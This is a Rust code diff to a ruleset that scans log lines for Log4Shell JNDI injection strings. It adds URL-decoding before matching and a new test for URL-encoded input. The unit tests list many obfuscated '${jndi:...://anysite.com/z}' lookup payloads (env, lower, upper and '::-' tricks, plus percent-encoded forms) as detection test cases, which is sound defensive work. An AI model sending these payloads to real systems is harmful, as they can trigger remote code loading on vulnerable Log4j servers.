@@ -1,3 +1,5 @@
+use urlencoding::decode;
+
 mod matcher;
 use matcher::Matcher;
 pub struct Ruleset {
@@ -13,8 +15,9 @@ impl Ruleset {
 
     pub fn match_rules(&self, line: &str) -> bool {
         let mut matchers: Vec<Matcher> = self.rules.iter().map(|rule| Matcher::new(rule)).collect();
+        let line = decode(line).map_or(line.to_lowercase(), |decoded| decoded.to_lowercase());
 
-        for c in line.to_ascii_lowercase().chars() {
+        for c in line.chars() {
             let is_match = matchers.iter_mut().any(|matcher| {
                 matcher.advance(c);
                 matcher.is_match()
@@ -66,11 +69,11 @@ mod tests {
     fn detects_ldaps() {
         let ruleset = Ruleset::new(&mut "${jndi:ldaps://".lines());
         let lines = vec![
-          "${jndi:ldaps://anysite.com/z}",
-          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}daps${env:ENV_NAME:-:}//anysite.com/z}",
-          "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}s://anysite.com/z}",
-          "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}s://anysite.com/z}",
-          "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:${::-s}://anysite.com/z}"
+            "${jndi:ldaps://anysite.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}daps${env:ENV_NAME:-:}//anysite.com/z}",
+            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}s://anysite.com/z}",
+            "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}s://anysite.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:${::-s}://anysite.com/z}"
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
@@ -80,11 +83,11 @@ mod tests {
     fn detects_dns() {
         let ruleset = Ruleset::new(&mut "${jndi:dns://".lines());
         let lines = vec![
-          "${jndi:dns://anysite.com/z}",
-          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-d}ns${env:ENV_NAME:-:}//anysite.com/z}",
-          "${${lower:j}ndi:${lower:d}n${lower:s}://anysite.com/z}",
-          "${${upper:j}ndi:${upper:d}n${lower:s}://anysite.com/z}",
-          "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://anysite.com/z}"
+            "${jndi:dns://anysite.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-d}ns${env:ENV_NAME:-:}//anysite.com/z}",
+            "${${lower:j}ndi:${lower:d}n${lower:s}://anysite.com/z}",
+            "${${upper:j}ndi:${upper:d}n${lower:s}://anysite.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://anysite.com/z}"
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
@@ -94,11 +97,11 @@ mod tests {
     fn detects_nis() {
         let ruleset = Ruleset::new(&mut "${jndi:nis://".lines());
         let lines = vec![
-          "${jndi:nis://anysite.com/z}",
-          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}is${env:ENV_NAME:-:}//anysite.com/z}",
-          "${${lower:j}ndi:${lower:n}i${lower:S}://anysite.com/z}",
-          "${${upper:j}ndi:${upper:n}I${lower:s}://anysite.com/z}",
-          "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-i}${::-s}://anysite.com/z}"
+            "${jndi:nis://anysite.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}is${env:ENV_NAME:-:}//anysite.com/z}",
+            "${${lower:j}ndi:${lower:n}i${lower:S}://anysite.com/z}",
+            "${${upper:j}ndi:${upper:n}I${lower:s}://anysite.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-i}${::-s}://anysite.com/z}"
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
@@ -108,11 +111,11 @@ mod tests {
     fn detects_nds() {
         let ruleset = Ruleset::new(&mut "${jndi:nds://".lines());
         let lines = vec![
-          "${jndi:nds://anysite.com/z}",
-          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}ds${env:ENV_NAME:-:}//anysite.com/z}",
-          "${${lower:j}ndi:${lower:n}d${lower:S}://anysite.com/z}",
-          "${${upper:j}ndi:${upper:n}D${lower:s}://anysite.com/z}",
-          "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-d}${::-s}://anysite.com/z}"
+            "${jndi:nds://anysite.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-n}ds${env:ENV_NAME:-:}//anysite.com/z}",
+            "${${lower:j}ndi:${lower:n}d${lower:S}://anysite.com/z}",
+            "${${upper:j}ndi:${upper:n}D${lower:s}://anysite.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-d}${::-s}://anysite.com/z}"
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
@@ -122,11 +125,22 @@ mod tests {
     fn detects_corba() {
         let ruleset = Ruleset::new(&mut "${jndi:corba://".lines());
         let lines = vec![
-          "${jndi:corba://anysite.com/z}",
-          "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-c}orba${env:ENV_NAME:-:}//anysite.com/z}",
-          "${${lower:j}ndi:${lower:c}${lower:o}r${lower:b}a://anysite.com/z}",
-          "${${upper:j}ndi:${upper:c}${upper:o}R${lower:b}a://anysite.com/z}",
-          "${${::-j}${::-n}${::-d}${::-i}:${::-c}${::-o}${::-r}${::-b}:${::-a}://anysite.com/z}"
+            "${jndi:corba://anysite.com/z}",
+            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-c}orba${env:ENV_NAME:-:}//anysite.com/z}",
+            "${${lower:j}ndi:${lower:c}${lower:o}r${lower:b}a://anysite.com/z}",
+            "${${upper:j}ndi:${upper:c}${upper:o}R${lower:b}a://anysite.com/z}",
+            "${${::-j}${::-n}${::-d}${::-i}:${::-c}${::-o}${::-r}${::-b}:${::-a}://anysite.com/z}"
+        ];
+
+        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
+    }
+
+    #[test]
+    fn detects_url_encoded_lines() {
+        let ruleset = Ruleset::new(&mut "${jndi:ldap://".lines());
+        let lines = vec![
+            "%24%7Bjndi%3Aldap%3A%2F%2Fanysite.com%2Fz%7D",
+            "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2Fanysite.com%2Fz%7D",
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
